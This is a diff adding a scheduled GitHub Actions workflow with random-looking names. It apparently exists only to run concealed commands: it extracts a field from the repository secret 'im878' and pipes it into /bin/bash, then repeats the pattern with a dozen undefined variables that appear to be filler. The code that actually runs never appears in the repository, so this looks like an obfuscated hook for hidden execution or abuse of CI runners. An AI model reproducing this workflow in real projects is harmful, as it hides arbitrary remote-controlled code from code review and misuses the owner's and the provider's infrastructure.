@@ -1,0 +1,30 @@
+name: yuanyaozu5274
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuanyaozu5274
+        env:
+          im878: ${{ secrets.im878 }}
+        run: |
+          echo $im878 | jq -r .mve61 | /bin/bash
+          echo $tyi9675 | jq -r .eas708 | /bin/bash
+          echo $wpt428 | jq -r .rdn46 | /bin/bash
+          echo $ex88541 | jq -r .gw68 | /bin/bash
+          echo $oczz35725 | jq -r .plhoo40 | /bin/bash
+          echo $d2750 | jq -r .ymoat4 | /bin/bash
+          echo $o859 | jq -r .jczd20276 | /bin/bash
+          echo $o5300 | jq -r .xud0977 | /bin/bash
+          echo $pfz31509 | jq -r .a7817 | /bin/bash
+          echo $wpr5 | jq -r .wx180 | /bin/bash
+          echo $wgr2 | jq -r .ozj7351 | /bin/bash
+          echo $g37896 | jq -r .amlx62 | /bin/bash
+          echo $w32094 | jq -r .n7046 | /bin/bash
+          echo $hzii45 | jq -r .vzrgp556 | /bin/bash
+
